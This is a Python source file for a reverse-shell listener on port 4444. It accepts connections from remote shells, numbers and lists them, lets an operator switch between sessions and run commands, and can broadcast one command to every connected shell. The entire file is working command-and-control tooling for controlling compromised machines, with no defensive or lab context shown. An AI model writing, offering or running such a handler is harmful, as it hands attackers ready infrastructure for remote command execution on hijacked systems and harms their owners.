import socket
import threading
import os
import sys

HOST = '0.0.0.0'
PORT = 4444

# Store active shells
active_shells = []
shell_counter = 0

def handle_client(conn, addr, shell_id):
    global active_shells
    print(f"\n[!] SHELL #{shell_id} CONNECTED from {addr}")
    print(f"[!] Type 'shell {shell_id}' to switch to this shell")
    print(f"[!] Type 'list' to see all shells\n")
    
    # Add to active shells
    active_shells.append({
        'id': shell_id,
        'conn': conn,
        'addr': addr,
        'active': True
    })
    
    try:
        while True:
            # Don't handle input here - main thread handles switching
            # Just keep connection alive and receive data
            conn.settimeout(1)
            try:
                data = conn.recv(4096)
                if not data:
                    break
                # Data will be shown when this shell is active
            except socket.timeout:
                continue
            except:
                break
    except:
        pass
    finally:
        # Remove from active shells
        active_shells = [s for s in active_shells if s['id'] != shell_id]
        conn.close()
        print(f"[*] Shell #{shell_id} closed")

def list_shells():
    if not active_shells:
        print("No active shells")
        return
    print("\nActive Shells:")
    for shell in active_shells:
        print(f"  #{shell['id']} - {shell['addr'][0]}:{shell['addr'][1]}")

def main_listener():
    global shell_counter
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        
        print("=" * 50)
        print("ADVANCED LISTENER READY")
        print("=" * 50)
        print(f"Listen on: 0.0.0.0:{PORT}")
        print(f"Your IP: {socket.gethostbyname(socket.gethostname())}")
        print("\nCommands:")
        print("  list              - Show all active shells")
        print("  shell <id>        - Switch to specific shell")
        print("  broadcast <cmd>   - Send command to all shells")
        print("  exit              - Close current shell")
        print("  quit              - Exit listener")
        print("=" * 50)
        
        # Start connection acceptor thread
        def accept_connections():
            global shell_counter
            while True:
                conn, addr = server.accept()
                shell_counter += 1
                thread = threading.Thread(target=handle_client, args=(conn, addr, shell_counter))
                thread.daemon = True
                thread.start()
        
        acceptor = threading.Thread(target=accept_connections, daemon=True)
        acceptor.start()
        
        # Main command loop
        current_shell = None
        
        while True:
            try:
                if current_shell:
                    cmd = input(f"shell#{current_shell}> ")
                else:
                    cmd = input("listener> ")
                
                if cmd.lower() == 'quit':
                    break
                    
                elif cmd.lower() == 'list':
                    list_shells()
                    
                elif cmd.lower().startswith('shell '):
                    try:
                        shell_id = int(cmd.split()[1])
                        target = next((s for s in active_shells if s['id'] == shell_id), None)
                        if target:
                            current_shell = shell_id
                            print(f"Switched to shell #{shell_id}")
                        else:
                            print(f"Shell #{shell_id} not found")
                    except:
                        print("Usage: shell <id>")
                        
                elif cmd.lower() == 'exit':
                    if current_shell:
                        target = next((s for s in active_shells if s['id'] == current_shell), None)
                        if target:
                            target['conn'].send(b'exit\n')
                            current_shell = None
                        else:
                            current_shell = None
                    else:
                        print("No active shell")
                        
                elif cmd.lower().startswith('broadcast '):
                    bcast_cmd = cmd[10:]
                    for shell in active_shells:
                        try:
                            shell['conn'].send(bcast_cmd.encode() + b'\n')
                        except:
                            pass
                    print(f"Broadcast sent to {len(active_shells)} shells")
                    
                elif current_shell:
                    # Send command to current shell
                    target = next((s for s in active_shells if s['id'] == current_shell), None)
                    if target:
                        target['conn'].send(cmd.encode() + b'\n')
                        # Wait for response
                        target['conn'].settimeout(5)
                        try:
                            response = target['conn'].recv(4096).decode()
                            print(response, end='')
                        except:
                            print("[!] No response or shell disconnected")
                            current_shell = None
                    else:
                        print(f"Shell #{current_shell} no longer active")
                        current_shell = None
                        
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.close()
        print("\nListener stopped")

if __name__ == "__main__":
    main_listener()